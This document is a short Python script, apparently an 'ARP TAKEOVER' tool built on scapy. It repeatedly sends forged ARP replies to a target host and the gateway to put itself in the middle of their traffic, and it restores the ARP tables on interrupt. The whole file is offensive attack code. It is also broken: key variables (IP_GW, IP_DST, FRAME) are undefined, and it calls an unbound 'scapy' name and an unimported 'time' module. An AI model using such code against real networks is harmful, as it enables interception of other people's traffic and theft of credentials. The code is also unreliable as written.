#!/usr/bin/env python3
# coding: utf-8

from scapy.all import *

print('### [ ARP TAKEOVER ] ###')
def get_mac(IP_DST):
    print('# [ ARP INFO ] #')
    FRAME_ARP = ARP(op="who-has",psrc=IP_GW,pdst=IP_DST)
    ARP_BRODCAST = FRAME/FRAME_ARP
    ARP_RESPONS = srp(ARP_BRODCAST, timeout=1,verbose=False)[0]
    print(ARP_RESPONS)
    return ARP_RESPONS[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
sent_packets_count = 0  
try:
    while True:
        spoof(IP_DST, IP_GW)
        spoof(IP_GW, IP_DST)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
    restore(IP_DST, IP_GW)
    restore(IP_GW, IP_DST)
    print("\nARP table restored. Quiting")